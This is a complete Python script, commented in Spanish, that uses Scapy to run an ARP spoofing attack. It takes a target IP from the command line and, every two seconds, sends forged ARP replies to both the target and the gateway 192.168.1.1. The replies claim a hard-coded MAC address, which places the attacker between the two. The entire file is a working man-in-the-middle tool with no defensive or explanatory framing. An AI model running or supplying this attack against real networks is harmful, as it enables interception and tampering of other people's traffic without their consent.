#!/usr/bin/env python3
import argparse
import time
import signal
import sys
import scapy.all as scapy
from termcolor import colored

def def_handler(sig,frame):
    print(colored(f"\n[!] Saliendo...\n",'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def get_arguments():
    parser = argparse.ArgumentParser(description='ARP Spoofer using Scapy')
    parser.add_argument("-t","--target",required=True,dest="ip_address",help=" IP Gateway or Specify a particular host to ARP poison.")
    return parser.parse_args()

def spoof(ip_address,spoof_ip):
    arp_packet = scapy.ARP(op=2,psrc=spoof_ip,pdst=ip_address,hwsrc="b0:35:9f:37:fb:63")
    scapy.send(arp_packet)

def main():
    arguments = get_arguments()
    while True:
        # IP Gateway puede variar, otra posibilidad es: 192.168.0.1
        spoof(arguments.ip_address,"192.168.1.1")
        spoof("192.168.1.1",arguments.ip_address)
        time.sleep(2)
if __name__ == '__main__':
    main()
